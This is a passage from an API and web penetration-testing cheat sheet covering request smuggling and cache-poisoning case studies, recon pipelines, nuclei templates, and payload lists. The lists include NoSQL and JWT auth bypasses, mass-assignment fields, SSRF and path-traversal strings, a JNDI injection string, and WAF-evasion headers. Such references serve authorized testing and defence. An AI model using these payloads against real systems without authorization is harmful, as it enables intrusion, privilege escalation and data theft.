Poison cache to inject malicious CSS that exfiltrates data from pages importing it.

### Error Page Gadget
Server errors reflecting URL:
```http
GET /foo.css?x=alert(1)%0A{}*{color:red;} HTTP/1.1
```
Response `Content-Type: text/html` contains error message with reflected payload.

---

## Real World Case Studies

### Case Study 1: PayPal Login Compromise
- **Vector**: Request Smuggling + Cache Poisoning + CSP Bypass
- **Chain**: Poison JS file on `c.paypal.com` → redirect to attacker → iframe loads uncached sub-page without CSP → steals plaintext passwords via Safari/IE
- **Bounty**: Critical

### Case Study 2: New Relic Internal API Access
- **Vector**: Request Smuggling + Header Reflection + Internal Header Guessing
- **Chain**: Smuggle request to leak internal headers → discover `Service-Gateway-Is-Newrelic-Admin` → gain admin access to internal API
- **Root Cause**: F5 gateway weakness (advisory K50375550)

### Case Study 3: Amazon CL.0 Desync
- **Vector**: Browser-Powered Desync (H2.0)
- **Chain**: `POST /b/` with body containing victim request → Amazon back-end ignores CL → stores victim requests (including auth tokens) in attacker's shopping list
- **Impact**: Mass account compromise potential (desync worm possible)

### Case Study 4: Trello Data Theft
- **Vector**: Request Smuggling + Store Attack
- **Chain**: Smuggle PUT request to attacker profile → victim's full HTTP request (headers, cookies) saved to attacker bio
- **Impact**: Session hijacking

### Case Study 5: GitHub Fat GET Cache Poisoning
- **Vector**: Fat GET + Cache Poisoning
- **Chain**: GET with body overrides `report` parameter → cache stores poisoned response → anyone accessing abuse report page reports wrong user
- **Bounty**: $10,000

### Case Study 6: Akamai / Capital One Client-Side Desync
- **Vector**: Client-Side Desync + Stacked HEAD
- **Chain**: `fetch()` POST to `/assets` → poison connection → navigate to homepage → execute XSS via reflected script in 404 response

### Case Study 7: Cisco WebVPN Client-Side Cache Poisoning
- **Vector**: Client-Side Desync + Cache Poisoning
- **Chain**: Poison connection with host-header redirect → navigate to JS resource → cache saves redirect → login page loads attacker JS
- **CVE**: CVE-2022-20713

### Case Study 8: BT / METROTEL ISP Proxy Compromise
- **Vector**: Invalid Host Header + Reverse Proxy Misrouting
- **Chain**: Send wrong Host header → ISP proxy routes to internal admin panel → access to traffic interception infrastructure
- **Impact**: Millions of users' traffic potentially compromised

---

## Fuzzing Payloads

### API Endpoint Fuzzing
```
/api/v1/{FUZZ}
/api/{FUZZ}/users
/{FUZZ}/api/users
/rest/{FUZZ}
/graphql/{FUZZ}
```

### Parameter Fuzzing
```
?id={FUZZ}&user={FUZZ}
?debug={FUZZ}&test={FUZZ}
?callback={FUZZ}&jsonp={FUZZ}
?_={FUZZ}&__={FUZZ}
```

### Value Fuzzing
```
true, false, 1, 0, -1, null, undefined, "", [], {}
admin, root, system, null, guest, test
../../../../etc/passwd, file:///etc/passwd, dict://, gopher://
<script>alert(1)</script>, ${jndi:ldap://x}, {{7*7}}
```

### HTTP Method Fuzzing
```
GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE, CONNECT
MOVE, COPY, LINK, UNLINK, LOCK, UNLOCK, PROPFIND, PROPPATCH, MKCOL
```

### Content-Type Fuzzing
```
application/json
application/xml
text/xml
application/x-www-form-urlencoded
text/plain
multipart/form-data; boundary=x
application/json; charset=utf-8; boundary=x
```

---

## Automation Workflows

### Recon Pipeline
```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt

# 2. HTTP probing
httpx -l subs.txt -o live.txt -status-code -tech-detect

# 3. API-specific path discovery
katana -list live.txt -o endpoints.txt -jc -d 5

# 4. Swagger/OpenAPI discovery
nuclei -t exposures/apis/ -l live.txt

# 5. Kiterunner API scanning
kr scan live.txt -w routes.kite -A=apiroutes-210328:20000 -x 10 --ignore-length=34

# 6. Parameter discovery
# Use Param Miner in Burp for hidden params, headers, cookies

# 7. Nuclei vulnerability scanning
nuclei -l live.txt -t http/vulnerabilities/
```

### Continuous Monitoring
```bash
# Monitor for new API endpoints
# Monitor for swagger.json changes
# Monitor for CORS misconfigurations
# Monitor for exposed .env / config files
```

### Race Condition Testing
```bash
# Turbo Intruder or custom Python with threading
# Fire 20-50 identical requests simultaneously
# Check for duplicate state changes (coupons, votes, transfers)
```

---

## Recon Methodology

### Phase 1: Discovery
1. **Subdomain enumeration**: `subfinder`, `amass`, `chaos`
2. **Port scanning**: `naabu`, `nmap` (common API ports: 80, 443, 8080, 8443, 3000, 5000, 8000, 9000)
3. **HTTP probing**: `httpx`, `httprobe`
4. **Content discovery**: `katana`, `gospider`, `hakrawler`
5. **API-specific discovery**:
   - Search for `/api`, `/swagger`, `/openapi.json`, `/graphql`
   - Check JavaScript files for endpoint references
   - Check mobile app traffic (mitmproxy, Burp Mobile Assistant)
   - Check GitHub for API documentation leaks

### Phase 2: Documentation Analysis
- Parse OpenAPI/Swagger with `swagger-codegen`, `Postman`, or Burp OpenAPI Parser.
- Identify all endpoints, methods, parameters, authentication requirements.
- Look for deprecated/internal endpoints still active.
- Map OWASP API Top 10 to documented endpoints.

### Phase 3: Endpoint Interaction
- Send requests to all endpoints with Burp Repeater.
- Test all HTTP methods on each endpoint.
- Switch content types and observe behavior.
- Analyze error messages for information disclosure.

### Phase 4: Attack Surface Expansion
- **Hidden parameters**: Param Miner, Burp Intruder
- **IDOR testing**: Increment IDs, test wildcards, test arrays
- **Mass Assignment**: Add fields from GET responses to POST/PATCH requests
- **Authentication bypass**: Test JWT manipulation, header spoofing

### Phase 5: Chaining & Escalation
- Combine low-severity findings into critical chains.
- Request smuggling → header leak → internal API access.
- Cache poisoning → stored XSS → account takeover.
- IDOR → mass assignment → vertical privilege escalation.

---

## Nuclei Templates

### API Exposure Detection
```yaml
id: swagger-api
info:
  name: Swagger API Exposure
  severity: info
requests:
  - method: GET
    path:
      - "{{BaseURL}}/swagger.json"
      - "{{BaseURL}}/api-docs"
    matchers:
      - type: word
        words:
          - "swagger"
          - "openapi"
```

### Token Spray Template
```bash
nuclei -t token-spray/ -var token=token_list.txt
```

### API Key Leak Template Logic
```yaml
id: api-key-leak
info:
  name: API Key Leak in Response
requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/config"
    matchers:
      - type: regex
        regex:
          - "[aA][kK][iI][aA][0-9A-Z]{16}"
          - "ghp_[a-zA-Z0-9]{36}"
```

### CORS Misconfiguration
```yaml
id: cors-misconfig
requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/user"
    headers:
      Origin: https://evil.com
    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
          - "Access-Control-Allow-Credentials: true"
```

---

## Tools and Scanners

### Recon & Discovery
| Tool | Purpose |
|------|---------|
| `subfinder` | Subdomain enumeration |
| `httpx` | Fast HTTP probing |
| `katana` | Web crawler / endpoint discovery |
| `kiterunner` | Contextual API route discovery |
| `naabu` | Port scanning |
| `dnsx` | DNS enumeration |
| `asnmap` | ASN mapping |

### Scanning & Exploitation
| Tool | Purpose |
|------|---------|
| `nuclei` | Vulnerability scanning with templates |
| `Burp Suite` | Manual testing, Param Miner, HTTP Request Smuggler |
| `Postman` | API request building / collection running |
| `NoSQLmap` | Automated NoSQL exploitation |
| `jwt_tool` | JWT analysis and exploitation |
| `trufflehog` | Secret scanning |
| `badsecrets` | Known weak secret detection |

### Specialized Burp Extensions
| Extension | Purpose |
|-----------|---------|
| **Param Miner** | Hidden parameter discovery, cache poisoning detection |
| **HTTP Request Smuggler** | Automated request smuggling detection |
| **Turbo Intruder** | High-speed race condition / fuzzing |
| **OpenAPI Parser** | Parse Swagger/OpenAPI docs |
| **Content Type Converter** | Convert between JSON/XML |
| **JS Link Finder** | Extract endpoints from JavaScript |
| **Collaborator Everywhere** | Inject pingback payloads to decloak backend systems |
| **Autorize / Authz / AuthMatrix** | Authorization testing |

### Request Smuggling Specific
- **HTTP Request Smuggler**: Automated detection with timeout-based methodology.
- **Turbo Intruder**: Custom scripts for confirmation and exploitation.
- **smuggler**: Python-based alternative by defparam.

---

## Advanced Research

### James Kettle (PortSwigger) Research Papers
1. **Cracking the Lens (2017)**: Targeting reverse proxies, load balancers, and analytics systems via malformed requests and esoteric headers. Introduced Collaborator Everywhere.
2. **HTTP Desync Attacks (2019)**: Revival of request smuggling with robust detection methodology, exploitation chains (Trello, PayPal, New Relic).
3. **Web Cache Entanglement (2020)**: Cache key normalization, parameter cloaking, fat GET, internal cache poisoning.
4. **Browser-Powered Desync (2022)**: Client-side desync attacks, CL.0/H2.0, pause-based desync, browser-based exploitation of single-server websites.

### Key Research Insights
- **You don't need header obfuscation for request smuggling** — surprising the server (e.g., missing Content-Length in HTTP/2) is sufficient.
- **Browser connection pools can be poisoned** — enabling attacks on single-server sites and internal networks.
- **Caches redefine what's exploitable** — "unexploitable" reflected XSS becomes stored via cache poisoning.
- **Internal caches are dangerous** — fragment-level caching can poison pages you don't have access to.

### Orange Tsai Research
- URL parsing inconsistencies across programming languages and libraries.
- Exploiting URL requester behavior differences (redirect handling, protocol support).

---

## Bug Bounty Writeups

### Notable Findings
- **Yahoo Traffic Server**: $15,000 — Invalid Host header → internal admin access → configuration changes.
- **GitHub Fat GET**: $10,000 — Cache poisoning via GET body parameter override.
- **PayPal**: Critical — Request smuggling + cache poisoning + CSP bypass → password theft.
- **New Relic**: Internal API admin access via request smuggling + header reflection.
- **Akamai / Capital One**: Client-side desync → XSS.
- **Cisco WebVPN**: CVE-2022-20713 — Client-side cache poisoning.
- **DoD Networks**: Multiple findings via Collaborator Everywhere + mass scanning.

### Writeup Patterns
1. Start with recon (documentation, JavaScript, mobile apps).
2. Identify unexpected behavior (error messages, verbose responses).
3. Automate detection (Param Miner, HTTP Request Smuggler).
4. Confirm with minimal collateral (timeout-based detection).
5. Escalate via chaining (smuggling → cache → XSS → account takeover).

---

## Payload Collections

### API Authentication Bypass
```
Authorization: Bearer null
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0...
Authorization: Basic YWRtaW46
Authorization: Basic YWRtaW46YWRtaW4=
X-Api-Key: null
X-Api-Key: undefined
```

### Mass Assignment Fields
```json
{"isAdmin": true, "role": "admin", "is_staff": true, "is_superuser": true,
 "permissions": ["*"], "plan": "enterprise", "verified": true,
 "email_verified": true, "active": true, "status": "active",
 "type": "admin", "group": "administrators", "tier": "premium"}
```

### NoSQL Auth Bypass
```
username[$ne]=admin&password[$ne]=admin
username[$gt]=admin&password[$gt]=admin
username[$regex]=.*&password[$regex]=.*
{"username": {"$nin": []}, "password": {"$nin": []}}
```

### IDOR Wildcards
```http
GET /api/users/*
GET /api/users/%
GET /api/users/.
GET /api/users/_
GET /api/users/?
```

### SSRF via APIs
```json
{"url": "http://127.0.0.1:22"}
{"url": "http://0.0.0.0:80"}
{"url": "http://[::]:80"}
{"url": "http://0177.0.0.1"}
{"url": "http://2130706433"}
{"url": "file:///etc/passwd"}
{"url": "dict://localhost:11211/stat"}
{"url": "gopher://localhost:9000/"}
```

---

## WAF Bypasses

### JSON WAF Bypasses
```json
{"id": 123}
{"id\x00": 123}
{"id": "1\x00"}
{"id": ["1"]}
{"id": {"id": 1}}
```

### NoSQL WAF Bypasses
```
username[$ne]=admin → username%5B%24ne%5D=admin
username[$where]=this.password.length>0
username[$regex]=^adm.*
```

### Header Injection WAF Bypasses
```http
X-Forwarded-For: 127.0.0.1, 127.0.0.1, 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Custom: bypass
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### Request Smuggling WAF Bypass
WAF may parse Content-Length while back-end parses Transfer-Encoding:
```http
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

---

## Detection Techniques

### Information Disclosure Detection
- Verbose error messages (stack traces, SQL errors, internal paths).
- `X-Debug-Token`, `X-Runtime`, `Server` headers.
- Different response lengths for valid vs invalid IDs.
- Timing differences (blind injection detection).

### Authentication Weakness Detection
- Missing rate limiting on login/reset endpoints.
- Predictable token patterns.
- JWT `none` algorithm acceptance.
- CORS with credentials on sensitive endpoints.

### Authorization Weakness Detection
- Access control tests with Autorize/Authz.
- IDOR detection via incremental ID testing.
- Horizontal/vertical privilege escalation paths.

### Request Smuggling Detection
1. **Timeout-based**: Send ambiguous request, observe time delay.
2. **Differential response**: Send poison + victim, observe unexpected status.
3. **HTTP Request Smuggler**: Automated with minimal false positives.
4. **Browser-powered**: Test with `fetch()` in real browser.

### Cache Poisoning Detection
1. **Param Miner**: Detects unkeyed headers, fat GET.
2. **Cache oracle**: Find endpoint with explicit hit/miss indicator.
3. **Cache buster headers**: `Origin`, `Accept-Encoding` variations.
4. **PURGE method**: Test for unauthorized cache deletion.

---

## References

### PortSwigger Resources
- https://portswigger.net/web-security/api-testing
- https://portswigger.net/web-security/api-testing/lab-exploiting-an-api-endpoint-using-documentation
- https://portswigger.net/web-security/api-testing/lab-exploiting-server-side-parameter-pollution-in-query-string
- https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability
- https://portswigger.net/web-security/api-testing/lab-exploiting-nosql-injection-in-api
- https://portswigger.net/web-security/api-testing/lab-exploiting-graphql-api
- https://portswigger.net/web-security/api-testing/lab-bypassing-rate-limits-via-race-conditions
- https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
- https://portswigger.net/research/browser-powered-desync-attacks
- https://portswigger.net/research/web-cache-entanglement
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### GitHub Resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Parameter%20Pollution
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- https://github.com/dolevf/Blackbird
- https://github.com/projectdiscovery/nuclei-templates/tree/main/http/exposures/apis
- https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities
- https://github.com/projectdiscovery/nuclei
- https://github.com/projectdiscovery/httpx
- https://github.com/projectdiscovery/katana
- https://github.com/projectdiscovery/subfinder
- https://github.com/projectdiscovery/interactsh
- https://github.com/projectdiscovery/notify
- https://github.com/projectdiscovery/uncover
- https://github.com/projectdiscovery/dnsx
- https://github.com/projectdiscovery/naabu
- https://github.com/projectdiscovery/mapcidr
- https://github.com/projectdiscovery/asnmap
- https://github.com/projectdiscovery/cdncheck
- https://github.com/projectdiscovery/tlsx
- https://github.com/projectdiscovery/alterx
- https://github.com/assetnote/kiterunner
- https://github.com/0xspade/bugbounty/tree/master/api
- https://github.com/payloadbox/api-payload-list
- https://github.com/PortSwigger/param-miner
- https://github.com/PortSwigger/http-request-smuggler
- https://github.com/defparam/smuggler
- https://github.com/mandatoryprogrammer/CursedChrome
- https://github.com/BlackFan/client-side-prototype-pollution
- https://github.com/fransr/postMessage-tracker
- https://github.com/yeswehack/pp-finder
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
- https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

### Educational & Reference
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/apis.html
- https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/apis.html
- https://owasp.org/API-Security/
- https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- https://swagger.io/specification/
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization
- https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API
- https://infosecwriteups.com/api-exploitation-guide-7d2f4c5b1e3a
- https://medium.com/@filedescriptor/advanced-api-exploitation-and-mass-assignment-techniques-2f4d7c1b5e3d

---

*Document compiled from real-world research, labs, and bug bounty findings. Use responsibly.*
